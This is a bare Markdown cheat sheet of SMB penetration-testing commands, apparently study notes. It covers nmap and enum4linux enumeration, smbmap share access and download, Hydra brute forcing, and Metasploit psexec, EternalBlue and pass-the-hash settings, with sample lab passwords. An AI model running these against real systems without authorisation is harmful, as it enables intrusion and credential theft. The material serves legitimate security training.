---
dg-publish: true
---
# SMB Commands

```bash
nmap -p445 --script smb-protocols (IPaddress)
nmap -p445 --script smb-security-mode (IPaddress)
nmap -p445 --script smb-enum-sessions (IPaddress)
nmap -p445 --script smb-enum-sessions --script-args smbusername=(username),smbpassword=(password) (IPaddress)
nmap -p445 --script smb-enum-shares (IPaddress)
nmap -p445 --script smb-enum-users --script-args smbusername=(username),smbpassword=(password) (IPaddress)
nmap -p445 --script smb-enum-domains --script-args smbusername=(username),smbpassword=(password) (IPaddress)
smbmap -u guest -p "" -d . -H (IPaddress)
smbmap -u administrator -p smbserver_771 -d . -H (IPaddress)
smbmap -H (IPaddress) -u (username) -p ('password') -L
smbmap -H (IPaddress) -u (username) -p ('') -r 'C$'
smbmap -H (IPaddress) -u (username) -p ('password') --download 'C$\filename'
nmap (IPaddress) -p 445 --script smb-os-discovery
use auxiliary/scanner/smb/smb_version
smbclient -L (IPaddress) -N
rpcclient -U "" -N (IPaddress)
enum4linux -o (IPaddress)
use auxiliary/scanner/smb/smb2
nmap --script smb-enum-users.nse -p445 (IPaddress)
use auxiliary/scanner/smb/smb_enumusers
enum4linux -U (IPaddress)
nmap (IPaddress) --script smb-enum-shares -p445
use auxiliary/scanner/smb/smb_enumshares
enum4linux -S (IPaddress)
enum4linux -G (IPaddress)
enum4linux -i (IPaddress)
use auxiliary/scanner/smb/smb_login
set SMBUser (username)
hydra -l admin -P (location) (IPaddress) smb
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass (password)
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass qwertyuiop
nmap -sV -p445 --script=smb-vuln-ms17-010 (IPaddress)
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_ms17_010
set SMBUser (user name)
set SMBPass (paste the hash value)
```
